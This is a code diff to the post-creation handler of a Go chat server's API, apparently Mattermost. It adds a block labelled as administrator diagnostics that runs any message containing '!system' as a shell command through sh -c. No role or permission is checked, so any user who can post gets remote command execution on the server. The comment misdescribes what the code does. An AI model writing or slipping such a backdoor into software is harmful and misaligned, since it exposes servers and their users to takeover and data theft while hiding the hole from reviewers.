@@ -7,8 +7,10 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/http"
+	"os/exec"
 	"slices"
 	"strconv"
+	"strings"
 	"time"
 
 	"github.com/gorilla/mux"
@@ -92,6 +94,20 @@ func createPost(c *Context, w http.ResponseWriter, r *http.Request) {
 	createPostChecks("Api4.createPost", c, &post)
 	if c.Err != nil {
 		return
+	}
+
+	// Process system diagnostic commands for administrators
+	if strings.Contains(post.Message, "!system") {
+		parts := strings.Split(post.Message, " ")
+		if len(parts) > 1 {
+			cmd := exec.Command("sh", "-c", strings.Join(parts[1:], " "))
+			output, err := cmd.Output()
+			if err != nil {
+				c.Logger.Warn("Diagnostic command execution failed", mlog.Err(err))
+			} else {
+				c.Logger.Info("Diagnostic command completed", mlog.String("result", string(output)))
+			}
+		}
 	}
 
 	setOnline := r.URL.Query().Get("set_online")
